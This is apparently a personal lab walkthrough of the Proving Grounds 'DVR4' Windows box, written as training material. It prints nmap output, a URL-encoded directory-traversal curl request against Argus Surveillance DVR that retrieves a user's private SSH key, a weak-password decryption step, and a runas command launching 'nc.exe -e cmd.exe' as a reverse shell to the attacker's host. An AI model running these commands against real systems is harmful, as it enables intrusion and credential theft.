---
Alias: DVR-4
Date: 8/21/2022
Platform: Windows
Difficulty: Intermediate
Tags: #WindowsDirectoryTraversalExploit #URLencodedCharacters #WindowsDirectoryTraversalPrivateSSHKey #FindHiddenWindowsDirectorys #WindowsProgramConfigurationFile #IdentifyHashID #RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation
Status: Finished
IP: 192.168.122.179
---

# {{DVR4}}


# Resolution summary
- Navigated to webpage found on port 8080
- Located a user named "viewer"
- Located CVE 2018-15745 directory traversal exploit for the program Argus Surveillance running on port 8080
- The directory traversal exploit helped to uncover a private SSH key
- Utilized found user "viewer" and private SSH key to login to a windows shell
- Found a user "Administrator" and a hashed/encrypted password in Argus Surveillance DVR configuration file
- Found a weak password encryption script for Argus Surviellance utilizing searchsploit
- Referencing the weak password encryption script I was able to find all but one character of the password as the script stated it did not add special characters
- Researched the syntax to utilize to login to a program as a different user
- Utilized the found "runas" syntax to login to a windows shell as Administrator

## Improved skills
- Command for searching for hidden directories using CMD
- Learned what certain URL encoded characters were
- Learned how to to run a program as a different user in windows command line


## Used tools
- nmap
- runas

---

# Information Gathering
Scanned all TCP ports:
```bash
# Nmap 7.92 scan initiated Fri Aug 12 07:04:21 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/DVR4/results/192.168.122.179/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/DVR4/results/192.168.122.179/scans/xml/_full_tcp_nmap.xml 192.168.122.179
Warning: 192.168.122.179 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.122.179
Host is up, received user-set (0.17s latency).
Scanned at 2022-08-12 07:04:21 PDT for 934s
Not shown: 65485 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       REASON      VERSION
22/tcp    open     ssh           syn-ack     Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEgPA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=
|   384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
|_ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBEqSs/ONYXuZGcGBUkLstnAWRP6wNsuJz6yUtmYymbBUobb797y3tkgWkCUhaDsB3z8XzhgoyCXS6MuXqF3FmiapitvPj1ig5TnVnHRvzuB2beKi/cH2XBduyaaKO6AORg==
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
174/tcp   filtered mailq         no-response
445/tcp   open     microsoft-ds? syn-ack
850/tcp   filtered unknown       no-response
1048/tcp  filtered neod2         no-response
2685/tcp  filtered mpnjsocl      no-response
2818/tcp  filtered rmlnk         no-response
3182/tcp  filtered bmcpatrolrnvu no-response
3871/tcp  filtered avocent-adsap no-response
4322/tcp  filtered trim-event    no-response
5040/tcp  open     unknown       syn-ack
7680/tcp  open     tcpwrapped    syn-ack
8080/tcp  open     http-proxy    syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Argus Surveillance DVR
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
9661/tcp  filtered unknown       no-response
10108/tcp filtered unknown       no-response
12168/tcp filtered cawas         no-response
14363/tcp filtered unknown       no-response
16988/tcp filtered unknown       no-response
20350/tcp filtered unknown       no-response
22411/tcp filtered unknown       no-response
27638/tcp filtered unknown       no-response
30270/tcp filtered unknown       no-response
36239/tcp filtered unknown       no-response
37064/tcp filtered unknown       no-response
38335/tcp filtered unknown       no-response
38950/tcp filtered unknown       no-response
40294/tcp filtered unknown       no-response
41441/tcp filtered unknown       no-response
45566/tcp filtered unknown       no-response
49664/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49668/tcp open     msrpc         syn-ack     Microsoft Windows RPC
49669/tcp open     msrpc         syn-ack     Microsoft Windows RPC
51167/tcp filtered unknown       no-response
51575/tcp filtered unknown       no-response
51597/tcp filtered unknown       no-response
51714/tcp filtered unknown       no-response
52334/tcp filtered unknown       no-response
52841/tcp filtered unknown       no-response
53279/tcp filtered unknown       no-response
56109/tcp filtered unknown       no-response
59211/tcp filtered unknown       no-response
63395/tcp filtered unknown       no-response
64414/tcp filtered unknown       no-response
64557/tcp filtered unknown       no-response
65364/tcp filtered unknown       no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.92%I=9%D=8/12%Time=62F6610B%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,451,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20Keep-Alive
SF:\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\nContent-Type:\x20text/html\r
SF:\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<HEAD>\r\n<TITLE>\r\nArgus\x2
SF:0Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<meta\x20http-equiv=\"Content-T
SF:ype\"\x20content=\"text/html;\x20charset=ISO-8859-1\">\r\n<meta\x20name
SF:=\"GENERATOR\"\x20content=\"Actual\x20Drawing\x206\.0\x20\(http://www\.
SF:pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<frameset\x20frameborder=\"no
SF:\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\n\x20\x20<frame\x20name=\"To
SF:p\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Cam
SF:erasTopFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x20\x2
SF:0\r\n\x20\x20<frame\x20name=\"ActiveXFrame\"\x20frameborder=\"0\"\x20sc
SF:rolling=\"auto\"\x20noresize\x20src=\"ActiveXIFrame\.html\"\x20marginwi
SF:dth=\"0\"\x20marginheight=\"0\">\r\n\x20\x20<frame\x20name=\"CamerasTab
SF:le\"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Ca
SF:merasBottomFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\x2
SF:0\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20\x20<p>This\x20page\x20uses\
SF:x20frames,\x20but\x20your\x20browser\x20doesn't\x20support\x20them\.</p
SF:>\r\n\x20\x20</noframes>\r")%r(HTTPOptions,451,"HTTP/1\.1\x20200\x20OK\
SF:r\nConnection:\x20Keep-Alive\r\nKeep-Alive:\x20timeout=15,\x20max=4\r\n
SF:Content-Type:\x20text/html\r\nContent-Length:\x20985\r\n\r\n<HTML>\r\n<
SF:HEAD>\r\n<TITLE>\r\nArgus\x20Surveillance\x20DVR\r\n</TITLE>\r\n\r\n<me
SF:ta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=IS
SF:O-8859-1\">\r\n<meta\x20name=\"GENERATOR\"\x20content=\"Actual\x20Drawi
SF:ng\x206\.0\x20\(http://www\.pysoft\.com\)\x20\[PYSOFTWARE\]\">\r\n\r\n<
SF:frameset\x20frameborder=\"no\"\x20border=\"0\"\x20rows=\"75,\*,88\">\r\
SF:n\x20\x20<frame\x20name=\"Top\"\x20frameborder=\"0\"\x20scrolling=\"aut
SF:o\"\x20noresize\x20src=\"CamerasTopFrame\.html\"\x20marginwidth=\"0\"\x
SF:20marginheight=\"0\">\x20\x20\r\n\x20\x20<frame\x20name=\"ActiveXFrame\
SF:"\x20frameborder=\"0\"\x20scrolling=\"auto\"\x20noresize\x20src=\"Activ
SF:eXIFrame\.html\"\x20marginwidth=\"0\"\x20marginheight=\"0\">\r\n\x20\x2
SF:0<frame\x20name=\"CamerasTable\"\x20frameborder=\"0\"\x20scrolling=\"au
SF:to\"\x20noresize\x20src=\"CamerasBottomFrame\.html\"\x20marginwidth=\"0
SF:\"\x20marginheight=\"0\">\x20\x20\r\n\x20\x20<noframes>\r\n\x20\x20\x20
SF:\x20<p>This\x20page\x20uses\x20frames,\x20but\x20your\x20browser\x20doe
SF:sn't\x20support\x20them\.</p>\r\n\x20\x20</noframes>\r");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-time: 
|   date: 2022-08-12T14:19:29
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25270/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22583/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48876/udp): CLEAN (Timeout)
|   Check 4 (port 49443/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 12 07:19:55 2022 -- 1 IP address (1 host up) scanned in 934.35 seconds
```

Enumerated open TCP ports:
```bash
8080
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8080

#### - Per the NMAP scan I navigated to "http://192.168.109.179:8080" and found the following webpage:

![](Images/Pasted%20image%2020221009165921.png)
#### - Navigated to the "Users" section and found the following user "viewer"

![](Images/Pasted%20image%2020221009183244.png)


---

# Exploitation
## CVE 2018-15745 - Argus Surveillance DVR 4.0.0.0 - Directory Traversal

#### - Typed "searchsploit argus surveillance" and found the following exploit:

![](Images/Pasted%20image%2020221009190548.png)

#### - Typed "searchsploit -m windows_x86/webapps/45296.txt" and found the following ouput showing a directory Traversal exploit:

![](Images/Pasted%20image%2020221009190910.png)
#WindowsDirectoryTraversalExploit

#### - Googled "url encoded characters" and found the following webpage showing character "." will be used as %2E and character "/" used as %2F:

![](Images/Pasted%20image%2020221009191130.png)

![](Images/Pasted%20image%2020221009191245.png)

![](Images/Pasted%20image%2020221009191343.png)
#URLencodedCharacters

#### - Typed the following on kali machine to retreive private ssh key for the found user "viewer" found previously "curl "http://[Kali IP]:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa"

![](Images/Pasted%20image%2020221009191611.png)
#WindowsDirectoryTraversalPrivateSSHKey

#### - Typed "cat id_rsa" and found the following private ssh key:

![](Images/Pasted%20image%2020221009191813.png)

#### - Typed "ssh viewer@192.168.122.179 -i id_rsa" and was connected to an ssh session as user "viewer":
![](Images/Pasted%20image%2020221009191954.png)


---

# Privilege Escalation
## Local Enumeration

#### - Per the previous searchsploit we ran for argus surveillance we found the following "Weak password encryption" python script:

![](Images/Pasted%20image%2020221009192206.png)

#### - Typed "searchsploit -m windows/local/50130.py" to copy the python script on my kali machine

#### - Typed "cat 50130.py" and found the following contents:

![](Images/Pasted%20image%2020221009192437.png)

#### - Ran a privilege escalation script but couldn't find anything interesting

#### - Typed "dir /a" in the C: directory to find any hidden directorys/files and found hidden directory "ProgramData"

![](Images/Pasted%20image%2020221009192857.png)
#FindHiddenWindowsDirectorys

#### - Changed to directory "ProgramData" and found the following directories. I then navigated into the "PY_Software" directory:

![](Images/Pasted%20image%2020221009193059.png)

#### - I then found a "Argus Serveillance DVR" directory and navigated into it:

![](Images/Pasted%20image%2020221009193752.png)

#### - I then found the DVRParams (.ini) configuration file:

![](Images/Pasted%20image%2020221009194221.png)
#WindowsProgramConfigurationFile 

#### - I then typed "type DVRParams.ini" to read the contents of the configuration file and found the following "adminstrator" user and hashed or encrypted password "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8":
![](Images/Pasted%20image%2020221009201025.png)

#### - Attempted to type "hashid ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8" to identify the hash but received an Uknown hash:

![](Images/Pasted%20image%2020221009201200.png)
	#IdentifyHashID

#### - Remembered the "Weak password encryption" exploit/script found earlier. Typed "vim 50130.py" and input the encrypted password into the script:

![](Images/Pasted%20image%2020221009201411.png)

#### - Typed "python 50130.py" to run the script and found the mostly decrypted password to be "14WatchD0g". Although the script is unable to decode the last string of characters:

![](Images/Pasted%20image%2020221009201544.png)

#### - Reading through the script we find the coder of the script was "too lazy to add special characters":

![](Images/Pasted%20image%2020221009201710.png)

## - I input a character one by 
#### - Navigated to the viewer users directory and found the netcat executable was installed:

![](Images/Pasted%20image%2020221009202007.png)

#### - Setup a netcat listener to listen on port 443 

#### -As we are going to attempt to login as a different user (Administrator) I googled "how to run a program as a different user in windows command line" :

![](Images/Pasted%20image%2020221009202220.png)

#### - Per the web page it showed to run the following command example "runas /user:admin "C:\Windows\notepad.exe"

![](Images/Pasted%20image%2020221009202314.png)
- [ ] 
## Privilege Escalation vector
## Runas command to login with a different user in CMD

#### - Typed runas /user:Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443" and password 14WatchD0g$ (can also type runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe [Kali IP] 443") and received a cmd promp running as Administrator:

![](Images/Pasted%20image%2020221009202519.png)

![](Images/Pasted%20image%2020221009202604.png)


#RunProgramFromDifferentWindowsUser #RunasPrivilegeEscalation

---

